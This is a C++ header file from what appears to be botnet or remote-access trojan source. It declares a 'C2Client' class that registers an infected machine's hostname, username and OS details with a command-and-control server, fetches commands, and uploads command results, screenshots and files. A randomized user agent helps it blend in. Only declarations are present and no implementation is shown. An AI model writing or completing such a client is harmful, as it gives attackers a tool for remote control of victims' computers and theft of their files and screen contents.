#ifndef NETWORK_HPP
#define NETWORK_HPP

#include <string>
#include <curl/curl.h>
#include "crypto.hpp"

namespace shadow_network {
    class C2Client {
    private:
        std::string c2_url;
        std::string bot_id;
        std::string passphrase;
        CURL* curl;
        
        static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp);
        std::string random_ua();
        
    public:
        C2Client(const std::string& url, const std::string& pass);
        ~C2Client();
        
        bool register_bot(const std::string& hostname, const std::string& username, 
                         const std::string& os_info);
        std::string check_commands();
        bool send_result(int cmd_id, const std::string& result);
        bool send_screenshot(const std::string& image_data);
        bool send_file(const std::string& filename, const std::string& file_data);
        
        std::string get_bot_id() const { return bot_id; }
    };
}

#endif
